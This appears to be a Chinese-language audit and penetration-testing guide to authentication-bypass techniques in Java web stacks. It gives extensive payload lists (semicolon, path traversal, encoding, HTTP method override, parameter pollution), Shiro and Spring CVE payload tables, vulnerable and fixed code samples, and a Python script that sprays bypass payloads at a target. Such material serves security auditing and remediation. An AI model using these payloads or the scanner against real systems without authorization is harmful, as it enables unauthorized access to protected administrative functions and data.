# 鉴权绕过模式

## 目录

- [一、前置知识](#一前置知识)
  - [1.1 绕过原理概述](#11-绕过原理概述)
  - [1.2 组件层面分析](#12-组件层面分析)
  - [1.3 代码层面分析](#13-代码层面分析)
- [二、绕过判断流程](#二绕过判断流程)
  - [2.1 技术栈识别](#21-技术栈识别)
  - [2.2 组合判断决策树](#22-组合判断决策树)
- [三、路径绕过](#三路径绕过)
- [四、参数绕过](#四参数绕过)
- [五、HTTP方法绕过](#五http方法绕过)
- [六、编码绕过](#六编码绕过)
- [七、逻辑绕过](#七逻辑绕过)
- [八、框架特定绕过](#八框架特定绕过)
- [九、绕过测试清单](#九绕过测试清单)
- [十、自动化测试脚本](#十自动化测试脚本)

---

## 一、前置知识

### 1.1 绕过原理概述

**鉴权绕过的核心原理：不同层次/组件对同一请求的解析结果不一致**

```
请求: GET /admin;.js

┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
│   反向代理层     │ --> │   Servlet容器   │ --> │   应用框架层     │
│  Nginx/Apache   │     │  Tomcat/Jetty   │     │  Spring/Shiro   │
│   (可能原样传递) │     │  (解析分号)      │     │  (路径匹配)      │
└─────────────────┘     └─────────────────┘     └─────────────────┘
      组件层面                组件层面               代码层面

关键问题：鉴权在哪一层？路由在哪一层？两者解析是否一致？
```

### 1.2 组件层面分析

#### 1.2.1 反向代理层

| 反向代理 | 分号处理 | 双斜杠处理 | 路径穿越处理 | 编码处理 |
|----------|----------|------------|--------------|----------|
| **Nginx** | 默认保留 | 可能归一化 | 默认保留 | 默认不解码 |
| **Apache** | 默认保留 | 归一化 | 可能处理 | 可配置解码 |
| **HAProxy** | 默认保留 | 取决于配置 | 取决于配置 | 默认不解码 |
| **无反代** | - | - | - | - |

**检查要点：**
- 反代是否过滤/重写特殊字符？
- 反代是否做路径归一化？
- 反代与后端路径传递是否一致？

#### 1.2.2 Servlet 容器层

| 容器 | getRequestURI() | getServletPath() | 分号处理 | 版本注意 |
|------|-----------------|------------------|----------|----------|
| **Tomcat** | 原样返回（含分号） | 截断分号 + 归一化 | `;` 后作为路径参数 | < 8.5.x 有差异 |
| **Jetty** | 原样返回 | 归一化 | 类似 Tomcat | 版本间有差异 |
| **Undertow** | 原样返回 | 归一化 | 类似 Tomcat | WildFly 默认容器 |
| **WebLogic** | 原样返回 | 有差异 | 需单独测试 | 企业环境常见 |

**关键 API 差异：**

| 获取方法 | 处理行为 | 安全等级 |
|----------|----------|----------|
| `getRequestURI()` | 原样返回，不做任何处理 | ❌ 危险 |
| `getRequestURL()` | 原样返回完整URL | ❌ 危险 |
| `getServletPath()` | 删除`;`后内容 + URL解码 + 路径归一化 | ✅ 安全 |
| `UrlPathHelper.getPathWithinApplication()` | 同 getServletPath | ✅ 推荐 |
| `HandlerMapping.BEST_MATCHING_PATTERN_ATTRIBUTE` | 返回匹配的Controller路径模式 | ✅ 最安全 |

#### 1.2.3 应用框架层

| 框架 | 路径匹配方式 | 已知问题 | 版本注意 |
|------|-------------|----------|----------|
| **Spring MVC** | AntPathMatcher / PathPattern | 后缀匹配（< 5.3） | 5.3 后默认禁用后缀匹配 |
| **Spring Security** | antMatchers / mvcMatchers | antMatchers 不匹配尾部斜杠 | 推荐使用 mvcMatchers |
| **Apache Shiro** | AntPathMatcher | 多个 CVE | 必须检查版本 |
| **自定义 Filter** | 取决于实现 | 常见漏洞源 | 重点审计对象 |

### 1.3 代码层面分析

#### 1.3.1 路径获取方式

```java
// ❌ 危险：原样返回，包含分号、编码等
String uri = request.getRequestURI();

// ❌ 危险：同上
String url = request.getRequestURL().toString();

// ✅ 相对安全：会处理分号和路径归一化
String path = request.getServletPath();

// ✅ 推荐：Spring 提供的工具类
UrlPathHelper helper = new UrlPathHelper();
String path = helper.getPathWithinApplication(request);
```

#### 1.3.2 路径匹配逻辑

| 匹配方式 | 风险 | 可能的绕过 |
|----------|------|------------|
| `uri.startsWith("/admin")` | 高 | 路径穿越 `/public/../admin` |
| `uri.endsWith(".js")` 白名单 | 高 | 分号绕过 `/admin;.js` |
| `uri.equals("/admin")` | 中 | 尾部斜杠 `/admin/` |
| `uri.contains("/admin")` | 中 | 双斜杠、编码 |
| 无大小写处理 | 中 | 大小写 `/Admin` |
| `AntPathMatcher.match()` | 低 | 取决于配置 |

#### 1.3.3 归一化处理检查

```java
// 检查是否有以下处理：
uri = uri.replaceAll(";.*", "");           // 分号截断
uri = uri.replaceAll("/+", "/");           // 双斜杠归一化
uri = URI.create(uri).normalize().getPath(); // 路径穿越归一化
uri = URLDecoder.decode(uri, "UTF-8");     // URL 解码
uri = uri.toLowerCase();                    // 大小写归一化
```

---

## 二、绕过判断流程

### 2.1 技术栈识别

**步骤一：识别各层组件**

```
1. 反向代理层
   └── Nginx? Apache? HAProxy? 无?
   
2. Servlet 容器层
   └── Tomcat? Jetty? Undertow? 版本?
   
3. 应用框架层
   └── Spring MVC? Struts? 版本?
   
4. 鉴权框架/方式
   └── Shiro? Spring Security? 自定义 Filter? JWT?
   └── 版本号?（用于检查已知 CVE）
```

**步骤二：分析鉴权代码**

```
1. 鉴权在哪一层实现？
   └── Filter? Interceptor? 注解? 框架配置?
   
2. 路径获取方式？
   └── getRequestURI()? getServletPath()?
   
3. 路径匹配逻辑？
   └── startsWith? endsWith? equals? 正则? AntMatcher?
   
4. 是否有归一化处理？
   └── 分号截断? 双斜杠处理? 路径穿越处理? URL解码?
   
5. 白名单配置？
   └── 静态资源后缀? 公开路径前缀?
```

### 2.2 组合判断决策树

```
┌─ 使用什么 API 获取路径？
│
├─ getRequestURI() / getRequestURL()
│   │
│   ├─ 有静态资源后缀白名单？(.js/.css/.png)
│   │   └─ ✅ 尝试：分号+后缀绕过 /admin;.js
│   │
│   ├─ 使用 startsWith() 匹配？
│   │   └─ ✅ 尝试：路径穿越 /public/../admin
│   │
│   ├─ 使用 equals() 精确匹配？
│   │   └─ ✅ 尝试：尾部斜杠 /admin/
│   │
│   ├─ 无双斜杠处理？
│   │   └─ ✅ 尝试：双斜杠 //admin
│   │
│   ├─ 无 URL 解码处理？
│   │   └─ ✅ 尝试：编码绕过 /%61dmin
│   │
│   └─ 无大小写处理？
│       └─ ✅ 尝试：大小写 /Admin
│
└─ getServletPath() / UrlPathHelper
    │
    └─ 分号/编码/双斜杠/穿越 绕过通常无效
        │
        ├─ 检查框架版本 CVE
        ├─ 检查 antMatchers vs mvcMatchers 差异
        └─ 检查后缀匹配配置（Spring < 5.3）
```

**快速对照表：**

| 发现的代码模式 | 优先尝试 | 次优先尝试 |
|----------------|----------|------------|
| `getRequestURI()` + `endsWith(".js")` 白名单 | `/admin;.js` | `/admin;.css` |
| `getRequestURI()` + `startsWith("/api")` | `/public/../api/x` | `//api/x` |
| `getRequestURI()` + `equals("/admin")` | `/admin/` | `/admin;` |
| `getRequestURI()` 无任何处理 | `/%61dmin` | `/admin%00` |
| Shiro < 1.6.0 | `/admin/;page` | `/admin/%2e` |
| Spring `antMatchers("/admin")` | `/admin/` | `/admin.json` |

---

## 三、路径绕过

### 3.1 分号参数绕过

**前置条件：**
- [x] 鉴权层使用 `getRequestURI()` 或 `getRequestURL()`
- [x] 路由层使用 `getServletPath()` 或 Spring MVC
- [x] 反向代理未过滤分号
- [x] 代码未对路径做分号截断处理

**不生效场景：**
- 鉴权使用 `getServletPath()`
- 反向代理过滤/重写了分号
- 代码中有 `uri.replaceAll(";.*", "")`

**原理：**

| 请求路径 | getRequestURI() | getServletPath() |
|----------|-----------------|------------------|
| `/api/admin;.js` | `/api/admin;.js` | `/api/admin` |
| `/api/admin;jsessionid=xxx` | `/api/admin;jsessionid=xxx` | `/api/admin` |

**Payload：**

```http
GET /admin; HTTP/1.1
GET /admin;.js HTTP/1.1
GET /admin;.css HTTP/1.1
GET /admin;.png HTTP/1.1
GET /admin;.html HTTP/1.1
GET /admin;.ico HTTP/1.1
GET /admin;jsessionid=xxx HTTP/1.1
GET /admin;a=b HTTP/1.1
GET /;/admin HTTP/1.1
```

**漏洞代码示例：**

```java
// ❌ 危险代码
public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) {
    HttpServletRequest request = (HttpServletRequest) req;
    String uri = request.getRequestURI();  // 返回 /admin;.js
    
    // 静态资源白名单
    if (uri.endsWith(".js") || uri.endsWith(".css")) {
        chain.doFilter(req, resp);  // 放行！
        return;
    }
    // 鉴权逻辑...
}
```

### 3.2 路径穿越绕过

**前置条件：**
- [x] 使用 `startsWith()` 或前缀匹配
- [x] 未对路径进行 `normalize()` 处理
- [x] 存在可访问的公开路径前缀

**Payload：**

```http
GET /admin/../admin/users HTTP/1.1
GET /admin/./users HTTP/1.1
GET /admin/users/.. HTTP/1.1
GET /admin/users/../users HTTP/1.1
GET /public/../admin HTTP/1.1
GET /static/../api/users HTTP/1.1
```

### 3.3 双斜杠绕过

**前置条件：**
- [x] 未对路径进行双斜杠归一化
- [x] 使用精确匹配或前缀匹配

**Payload：**

```http
GET //admin HTTP/1.1
GET /admin//users HTTP/1.1
GET ///admin HTTP/1.1
GET /api//admin HTTP/1.1
```

### 3.4 尾部斜杠绕过

**前置条件：**
- [x] 使用 `equals()` 精确匹配
- [x] 或使用 Spring Security `antMatchers()` 而非 `mvcMatchers()`

**Payload：**

```http
GET /admin/ HTTP/1.1
GET /admin/// HTTP/1.1
```

### 3.5 大小写绕过

**前置条件：**
- [x] 路径匹配区分大小写
- [x] 后端路由不区分大小写（Windows 或特定配置）

**Payload：**

```http
GET /Admin HTTP/1.1
GET /ADMIN HTTP/1.1
GET /aDmIn HTTP/1.1
GET /AdMiN HTTP/1.1
```

### 3.6 点号绕过

**前置条件：**
- [x] 未对路径进行归一化
- [x] 使用简单字符串匹配

**Payload：**

```http
GET /admin. HTTP/1.1
GET /admin.. HTTP/1.1
GET /.admin HTTP/1.1
GET /admin/./ HTTP/1.1
```

### 3.7 空字节绕过

**前置条件：**
- [x] 后端语言/框架对空字节处理有差异
- [x] 常见于老版本或特定语言（如 PHP、老版本 Java）

**Payload：**

```http
GET /admin%00 HTTP/1.1
GET /admin%00.jpg HTTP/1.1
GET /admin%00.js HTTP/1.1
```

### 3.8 反斜杠绕过 (Windows)

**前置条件：**
- [x] 后端运行在 Windows 系统
- [x] 路径处理未统一斜杠方向

**Payload：**

```http
GET /admin\users HTTP/1.1
GET \admin HTTP/1.1
GET /admin\..\admin HTTP/1.1
```

---

## 四、参数绕过

### 4.1 参数覆盖

**前置条件：**
- [x] 后端直接使用请求参数绑定到权限字段
- [x] 未对敏感参数进行过滤

**Payload：**

```http
POST /api/updateUser HTTP/1.1
Content-Type: application/x-www-form-urlencoded

role=admin
role=user&role=admin
```

### 4.2 隐藏参数

**前置条件：**
- [x] 后端存在未公开的调试/管理参数
- [x] 参数未做权限校验

**Payload：**

```http
POST /api/createOrder HTTP/1.1
Content-Type: application/x-www-form-urlencoded

amount=100&isAdmin=true
amount=100&debug=true
amount=100&skipAuth=1
amount=100&_internal=1
```

### 4.3 数组/对象注入

**前置条件：**
- [x] 使用 JSON 绑定且未限制字段
- [x] 后端使用宽松的反序列化

**Payload：**

```json
{"userId": 1, "role": "admin"}
{"userId": [1, 2]}
{"userId": {"$gt": 0}}
{"__proto__": {"isAdmin": true}}
```

---

## 五、HTTP方法绕过

### 5.1 方法切换

**前置条件：**
- [x] 鉴权配置只针对特定 HTTP 方法
- [x] 后端接口支持多种方法

**Payload：**

```http
GET /admin/delete HTTP/1.1
PUT /admin/delete HTTP/1.1
DELETE /admin/delete HTTP/1.1
PATCH /admin/delete HTTP/1.1
OPTIONS /admin/delete HTTP/1.1
HEAD /admin/delete HTTP/1.1
```

### 5.2 方法覆盖

**前置条件：**
- [x] 框架支持 HTTP 方法覆盖
- [x] 如 Spring 的 `HiddenHttpMethodFilter`

**Payload：**

```http
POST /admin/delete HTTP/1.1
X-HTTP-Method-Override: GET

POST /admin/delete HTTP/1.1
X-HTTP-Method: DELETE

POST /admin/delete HTTP/1.1
X-Method-Override: PUT

POST /admin/delete HTTP/1.1
Content-Type: application/x-www-form-urlencoded

_method=GET
```

### 5.3 TRACE/TRACK 方法

**前置条件：**
- [x] 服务器未禁用 TRACE/TRACK 方法
- [x] 可能泄露敏感头信息

**Payload：**

```http
TRACE /admin/users HTTP/1.1
TRACK /admin/users HTTP/1.1
```

---

## 六、编码绕过

### 6.1 URL 编码

**前置条件：**
- [x] 鉴权在 URL 解码前进行匹配
- [x] 使用 `getRequestURI()` 获取路径

**Payload：**

```http
GET /%61dmin HTTP/1.1          # a -> %61
GET /ad%6din HTTP/1.1          # m -> %6d
GET /%61%64%6d%69%6e HTTP/1.1  # admin 全编码
GET /admin%2fusers HTTP/1.1    # / -> %2f
```

### 6.2 双重编码

**前置条件：**
- [x] 存在两次 URL 解码
- [x] 第一次解码后进行鉴权，第二次解码后进行路由

**Payload：**

```http
GET /%2561dmin HTTP/1.1        # %25 = %, %2561 -> %61 -> a
GET /admin%252f.. HTTP/1.1     # %252f -> %2f -> /
GET /%252e%252e/admin HTTP/1.1 # %252e -> %2e -> .
```

### 6.3 Unicode 编码

**前置条件：**
- [x] 后端支持 Unicode 解析
- [x] 常见于特定环境（如 IIS、老版本 Tomcat）

**Payload：**

```http
GET /\u0061dmin HTTP/1.1       # \u0061 = a
GET /%c0%ae/admin HTTP/1.1     # Unicode 过长编码 (.)
GET /%c0%af/admin HTTP/1.1     # Unicode 过长编码 (/)
```

### 6.4 HTML 实体编码

**前置条件：**
- [x] 后端对 HTML 实体进行解码
- [x] 较少见，特定场景

**Payload：**

```http
GET /&#97;dmin HTTP/1.1        # &#97; = a
GET /&#x61;dmin HTTP/1.1       # &#x61; = a
```

---

## 七、逻辑绕过

### 7.1 条件竞争

**前置条件：**
- [x] 权限检查和操作执行非原子性
- [x] 存在时间窗口可利用

**攻击方式：**

```
Thread 1: 检查权限 -> (上下文切换) -> 执行操作
Thread 2: 在检查和执行之间修改权限状态
```

### 7.2 状态机绕过

**前置条件：**
- [x] 业务流程有多个步骤
- [x] 后续步骤未校验前置步骤是否完成

**示例：**

```
正常流程: 创建订单 -> 支付 -> 确认
绕过尝试: 直接调用确认接口，跳过支付
```

### 7.3 引用绕过

**前置条件：**
- [x] 通过间接引用可获取受保护资源
- [x] 关联接口未做同等权限校验

**示例：**

```
正常: /api/users/1  # 被保护
绕过: /api/orders?userId=1  # 未保护，但返回用户信息
绕过: /api/export?type=users  # 导出功能未保护
```

### 7.4 缓存绕过

**前置条件：**
- [x] 响应被缓存且未区分用户权限
- [x] CDN/反代缓存配置不当

**示例：**

```
请求1 (admin): GET /api/users -> 响应被缓存
请求2 (guest): GET /api/users -> 返回缓存的管理员数据
```

---

## 八、框架特定绕过

### 8.1 Apache Shiro

| CVE | 影响版本 | 修复版本 | Payload | 原理 | 利用前提 |
|-----|----------|----------|---------|------|----------|
| CVE-2020-1957 | < 1.5.2 | >= 1.5.2 | `/xxx/..;/admin` | 路径穿越 + 分号 | 需配合 Spring 动态控制器 |
| CVE-2020-11989 | < 1.5.3 | >= 1.5.3 | `/admin/..%2f` | URL 编码斜杠路径穿越 | **需配合 Spring 动态控制器** |
| CVE-2020-13933 | < 1.6.0 | >= 1.6.0 | `/admin/;page` | 分号绕过 | 使用 `/*` 通配符 |
| CVE-2020-17523 | < 1.7.1 | >= 1.7.1 | 空白字符注入 | SpringBeanTypeConverter 类型转换缺陷 | **需 Spring 集成环境** |
| CVE-2021-41303 | < 1.8.0 | >= 1.8.0 | `/admin/%2e` | 点号编码 | 路径匹配差异 |
| CVE-2022-32532 | < 1.9.1 | >= 1.9.1 | `/admin%0a` | 正则 `.` 不匹配换行符 | 使用 RegexRequestMatcher |

**CVE-2020-17523 详细说明：**

此漏洞不是简单的 URL 路径空格编码绕过，而是 Shiro 与 Spring 集成时的类型转换缺陷：
- 漏洞位于 `SpringBeanTypeConverter` 组件
- 攻击者可利用空白字符操纵 classname 值绕过认证
- **必须在 Shiro + Spring 集成环境下才能利用**

**检测方法：**
```bash
# 查看 pom.xml
grep -r "shiro" pom.xml

# 查看 jar 版本
ls -la WEB-INF/lib/ | grep shiro

# 检查是否使用 Spring 集成
grep -r "shiro-spring" pom.xml
```

### 8.2 Spring Security

| 问题 | 影响情况 | Payload | 修复方式 |
|------|----------|---------|----------|
| antMatchers 尾部斜杠 | 使用 antMatchers | `/admin/` | 改用 mvcMatchers |
| 正则匹配问题 | regexMatchers 配置不当 | `/api/v/admin` | 修正正则表达式 |
| CVE-2022-22978 | < 5.4.11 / < 5.5.7 / < 5.6.4 | `/path%0a` 换行符绕过 | 升级版本 |

**antMatchers vs mvcMatchers：**

```java
// ❌ antMatchers 不匹配尾部斜杠
http.authorizeRequests()
    .antMatchers("/admin").authenticated()  // /admin/ 可绕过

// ✅ mvcMatchers 匹配更严格
http.authorizeRequests()
    .mvcMatchers("/admin").authenticated()  // /admin/ 也会匹配
```

**Spring 6 / Spring Boot 3+ 重要变更：**

从 Spring 6 / Spring Boot 3 开始，Spring MVC 默认使用 `PathPatternParser`，且 `matchOptionalTrailingSeparator` 默认为 `false`：

- `/users` **不再自动匹配** `/users/`
- 这改变了之前的默认行为

```java
// Spring 6+ 如需恢复旧行为（匹配尾部斜杠）
@Configuration
public class WebConfig implements WebMvcConfigurer {
    @Override
    public void configurePathMatch(PathMatchConfigurer configurer) {
        configurer.setUseTrailingSlashMatch(true);
    }
}
```

**审计注意事项：**
- Spring 5.x 及之前：重点检查 antMatchers 尾部斜杠问题
- Spring 6.x / Boot 3+：默认行为已修复，但需检查是否有手动配置恢复旧行为

### 8.3 Spring MVC

| 问题 | 影响版本 | Payload | 修复方式 |
|------|----------|---------|----------|
| 后缀匹配 | < 5.3 (默认启用) | `/admin.json` | 升级或禁用后缀匹配 |
| Matrix Variables | 启用时 | `/users/1;role=admin` | 禁用或严格校验 |

**禁用后缀匹配：**

```java
@Configuration
public class WebConfig implements WebMvcConfigurer {
    @Override
    public void configurePathMatch(PathMatchConfigurer configurer) {
        configurer.setUseSuffixPatternMatch(false);
    }
}
```

---

## 九、绕过测试清单

### 9.1 路径测试

```bash
# 基础变形
/admin
/admin/
/Admin
/ADMIN

# 分号绕过
/admin;
/admin;.js
/admin;.css
/admin;.png
/admin;jsessionid=xxx

# 路径穿越
/admin/../admin
/public/../admin
/admin/./
/admin/users/..

# 双斜杠
//admin
/admin//users
///admin

# 编码
/%61dmin
/%2561dmin
/admin%2f..

# 特殊字符
/admin%00
/admin%00.jpg
/admin.
/admin..
```

### 9.2 参数测试

```bash
# 隐藏参数
?debug=true
?admin=1
?role=admin
?_internal=1
?skipAuth=1

# 参数污染
?role=user&role=admin
?id=1&id=2
```

### 9.3 方法测试

```bash
# 方法切换
GET, POST, PUT, DELETE, PATCH, OPTIONS, HEAD, TRACE

# 方法覆盖
X-HTTP-Method-Override: GET
X-HTTP-Method: DELETE
X-Method-Override: PUT
_method=GET
```

### 9.4 框架版本检测

```bash
# Shiro 版本
grep -r "shiro-core" pom.xml
ls WEB-INF/lib/ | grep shiro

# Spring 版本
grep -r "spring-security" pom.xml
grep -r "spring-webmvc" pom.xml

# 查看 MANIFEST.MF
unzip -p xxx.jar META-INF/MANIFEST.MF
```

---

## 十、自动化测试脚本

```python
#!/usr/bin/env python3
"""
鉴权绕过自动化测试脚本
用法: python3 bypass_test.py -t http://target.com -p /admin
"""

import requests
import argparse
from urllib.parse import quote

def generate_payloads(path):
    """生成绕过 Payload"""
    payloads = [
        # 原始路径
        path,
        
        # 尾部斜杠
        f"{path}/",
        f"{path}///",
        
        # 大小写
        path.upper(),
        path.capitalize(),
        
        # 分号绕过
        f"{path};",
        f"{path};.js",
        f"{path};.css",
        f"{path};.png",
        f"{path};.html",
        f"{path};jsessionid=test",
        
        # 路径穿越
        f"{path}/../{path.split('/')[-1]}",
        f"{path}/./",
        f"/public/../{path[1:]}",
        
        # 双斜杠
        f"/{path}",
        f"//{path[1:]}",
        f"{path}//",
        
        # 编码
        path.replace('a', '%61'),
        path.replace('/', '%2f'),
        f"{path}%00",
        f"{path}%00.jpg",
        
        # 双重编码
        path.replace('a', '%2561'),
        
        # 点号
        f"{path}.",
        f"{path}.json",
        f"{path}.xml",
    ]
    return list(set(payloads))  # 去重

def test_bypass(target, path, methods=None, cookies=None, headers=None):
    """测试绕过"""
    if methods is None:
        methods = ["GET", "POST", "PUT", "DELETE", "OPTIONS", "HEAD"]
    
    payloads = generate_payloads(path)
    results = []
    
    for payload in payloads:
        for method in methods:
            try:
                url = f"{target.rstrip('/')}{payload}"
                resp = requests.request(
                    method, 
                    url, 
                    cookies=cookies,
                    headers=headers,
                    timeout=10,
                    allow_redirects=False
                )
                
                # 非 401/403 可能是绕过成功
                if resp.status_code not in [401, 403, 302, 301]:
                    results.append({
                        "method": method,
                        "payload": payload,
                        "status": resp.status_code,
                        "length": len(resp.content)
                    })
                    print(f"[!] Potential bypass: {method} {payload} -> {resp.status_code}")
                    
            except Exception as e:
                pass
    
    return results

def main():
    parser = argparse.ArgumentParser(description="鉴权绕过测试")
    parser.add_argument("-t", "--target", required=True, help="目标 URL")
    parser.add_argument("-p", "--path", required=True, help="受保护路径")
    parser.add_argument("-c", "--cookie", help="Cookie")
    parser.add_argument("-H", "--header", action="append", help="自定义 Header")
    
    args = parser.parse_args()
    
    cookies = {}
    if args.cookie:
        for c in args.cookie.split(";"):
            k, v = c.strip().split("=", 1)
            cookies[k] = v
    
    headers = {}
    if args.header:
        for h in args.header:
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()
    
    print(f"[*] Target: {args.target}")
    print(f"[*] Path: {args.path}")
    print(f"[*] Starting bypass tests...")
    print("-" * 50)
    
    results = test_bypass(args.target, args.path, cookies=cookies, headers=headers)
    
    print("-" * 50)
    print(f"[*] Found {len(results)} potential bypasses")

if __name__ == "__main__":
    main()
```

---

## 输出示例

```markdown
=== [BYPASS-001] 分号绕过 ===
风险等级: 高
目标路径: /admin
绕过路径: /admin;.js

前置条件验证:
- [x] 使用 getRequestURI() 获取路径
- [x] 存在 .js 后缀白名单
- [x] 未做分号截断处理

问题描述:
- 鉴权 Filter 使用 getRequestURI() 获取路径
- 存在静态资源后缀白名单 (.js, .css, .png)
- Spring MVC 路由使用 getServletPath()，会截断分号

验证 PoC:
```http
GET /admin;.js HTTP/1.1
Host: {{host}}
```

响应: 200 OK (预期: 401/403)

建议修复:
1. 使用 getServletPath() 或 UrlPathHelper 获取路径
2. 在匹配前对路径进行分号截断: uri.replaceAll(";.*", "")
3. 移除不必要的静态资源白名单

---

=== [BYPASS-002] 路径穿越绕过 ===
风险等级: 高
目标路径: /admin/users
绕过路径: /public/../admin/users

前置条件验证:
- [x] 使用 startsWith() 进行路径匹配
- [x] 未对路径进行 normalize() 处理
- [x] 存在可访问的公开路径 /public

问题描述:
- Filter 使用 startsWith("/admin") 匹配保护路径
- 未对路径进行规范化处理
- /public 路径可公开访问

验证 PoC:
```http
GET /public/../admin/users HTTP/1.1
Host: {{host}}
```

响应: 200 OK (预期: 401/403)

建议修复:
1. 在路径匹配前进行规范化: URI.create(uri).normalize().getPath()
2. 使用 AntPathMatcher 或框架提供的路径匹配器
3. 对路径进行严格校验，拒绝包含 .. 的请求
```
